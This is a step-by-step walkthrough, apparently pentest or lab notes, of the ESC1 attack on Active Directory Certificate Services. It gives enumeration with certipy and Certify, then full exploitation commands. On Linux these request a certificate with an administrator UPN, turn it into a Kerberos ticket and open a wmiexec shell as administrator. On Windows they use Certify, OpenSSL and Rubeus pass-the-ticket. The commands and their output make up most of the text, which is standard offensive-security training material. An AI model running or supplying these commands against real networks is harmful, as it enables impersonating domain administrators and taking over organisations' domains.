This is the "easiest" attack vector available and targets specifically the *Certificate Templates* itself.
To make it short basically this attack happens when a "low-priv" can enroll a certificate by specifying an alternative SAN(`subjectAltName`) allowing the attacker to request on behalf of another user and virtually impersonating it.


## Requisites
In order to pursuit this path the following steps must be fulfilled:
1. The Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (social engineering tactics can bypass these security measures).
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template defines EKUs that enable authentication.
6. The certificate template allows requesters to specify a `subjectAltName (SAN)` in the `CSR`.


## Enumeration
To identify potential Templates that can be used to carry an ESC1 type attack we can do:
**Linux:**
```
certipy-ad find -u 'USERNAME' -p 'PASSWORD' -dc-ip IP -vulnerable -stdout

Example:
Certificate Templates
  4
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'LAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```
In this case we can see that our requirements are fulfilled as:
- Enrollment Rights: `LAB.LOCAL\Domain Users`.
- Requires Manager Approval: `False`.
- Authorized Signature Required: `0`.
- Client Authentication: `True` or Extended Key Usage `Client Authentication`.
- Enrollee Supplies Subject: `True` aka alternative SAN.
**Windows:**
```
.\Certify.exe find /vulnerable
Example:
<SNIP>  
[!] Vulnerable Certificates Templates :

    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC1
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
```


# Attack Time
The attack vector can be performed on same ways both from a Window or Linux based OS.
## Linux way
After we identified the vulnerable Template, CA-Name and ascertain that we are allowed to enroll as Domain user we can proceed with the attack.
- We need to enroll a new certificate with a SAN that will reflect the user we want to impersonate(in this case is the Domain Administrator) 
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator@lab.local
```
- The *pfx* certificate from the previous step can be now used to perform a client authentication and obtain a valid Kerberos ticket
```
certipy-ad auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```
- Lastly, we need to point the ticket in *ccache* format to be used in a *PassTheTicket* type attack and login into the server as Administrator (use the FQDN of the DC)
```
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL

Impacket v0.11.0 - Copyright 2023 Fortra
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab\administrator
```
## Windows way
The same attack can be done directly from a Windows machine.
- We can start by enrolling a new certificate via Certify.exe
```
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local
```
- Next we need to convert the generated certificate to a valid *pfx* which contains the private-key as well. **OBS: Password can be left void.**
```
 & "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- Now we can use the certificate to perform a client authentication and obtain a TGT ticket that can be used afterwards in same session.
```
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap /ptt
```
With the token injected into current session we can take it further and perform the attack type *PassTheTicket* to go in deeper into the environment.